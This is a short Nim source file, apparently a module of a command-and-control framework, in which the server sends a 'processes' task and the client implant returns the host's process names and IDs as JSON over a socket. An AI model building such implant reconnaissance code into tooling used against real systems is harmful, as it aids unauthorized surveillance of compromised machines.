when defined(server):
  import asyncdispatch
  import ../server/[types, communication]

when defined(client):
  import std/[os, net, json, jsonutils]
  import ../client/communication

when defined(server):
  proc sendTask*(client: C2Client): Future[Task] {.async.} =
    return await client.sendClientTask("processes")

when defined(client):
  proc executeTask*(socket: Socket, taskId: int, processes: seq[tuple[name: string, id: int]]) =

    socket.sendOutput(taskId, "PROCESSES", 
      $(%*{
        "processes": toJson processes
      })
    )
